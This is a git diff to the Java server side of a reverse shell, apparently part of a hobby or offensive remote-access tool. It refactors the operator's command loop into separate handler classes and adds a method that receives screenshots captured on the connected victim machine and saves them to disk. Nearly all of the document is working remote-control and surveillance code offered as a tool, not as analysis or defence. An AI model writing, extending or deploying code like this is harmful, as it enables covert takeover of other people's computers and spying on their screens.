@@ -1,7 +1,9 @@
-package obs1d1anc1ph3r.reverseshell;
+package obs1d1anc1ph3r.reverseshell.server;
 
+import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.*;
+import javax.imageio.ImageIO;
 
 public class ReverseShellServer {
 
@@ -11,6 +13,7 @@ public class ReverseShellServer {
     private BufferedReader in;
     private PrintWriter out;
     private BufferedReader userInput;
+    private DataInputStream dataIn;
 
     public static void main(String[] args) {
         ReverseShellServer server = new ReverseShellServer();
@@ -23,9 +26,9 @@ public class ReverseShellServer {
             waitForConnection();
             setupStreams();
 
-            Thread outputReceiver = new Thread(this::receiveResponse);
+            Thread outputReceiver = new Thread(new ResponseHandler(in));
             outputReceiver.start();
-            handleShell();
+            new CommandSender(out, userInput, this).handleShell();
 
         } catch (IOException e) {
             System.err.println("[ERROR] Server error: " + e.getMessage());
@@ -51,35 +54,28 @@ public class ReverseShellServer {
         userInput = new BufferedReader(new InputStreamReader(System.in));
     }
 
-    private void handleShell() throws IOException {
-        String command;
-        System.out.print("\nCommand> ");
-        while (true) {
-            command = userInput.readLine();
-
-            if ("exit".equalsIgnoreCase(command)) {
-                sendCommand("exit");
-                break;
-            }
-
-            sendCommand(command);
-        }
-    }
-
-    private void sendCommand(String command) {
-        out.println(command);
-    }
-
-    private void receiveResponse() {
+    public void receiveScreenshot() {
         try {
-            String response;
-            while ((response = in.readLine()) != null) {
-                System.out.println("Shell> " + response);
-                System.out.print("Command> ");
-            }
+            System.out.println("[*] Receiving screenshot...");
+
+            int fileSize = dataIn.readInt();
+            byte[] imageBytes = new byte[fileSize];
+            dataIn.readFully(imageBytes);
+
+            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(imageBytes);
+            BufferedImage image = ImageIO.read(byteArrayInputStream);
+
+            File outputFile = new File("screenshot.png");
+            ImageIO.write(image, "png", outputFile);
+            System.out.println("[+] Screenshot received and saved as " + outputFile.getAbsolutePath());
+
         } catch (IOException e) {
-            System.err.println("[ERROR] Error receiving response: " + e.getMessage());
+            System.err.println("[ERROR] Failed to receive screenshot: " + e.getMessage());
         }
+    }
+
+    public Socket getClientSocket() {
+        return clientSocket;
     }
 
     private void cleanup() {
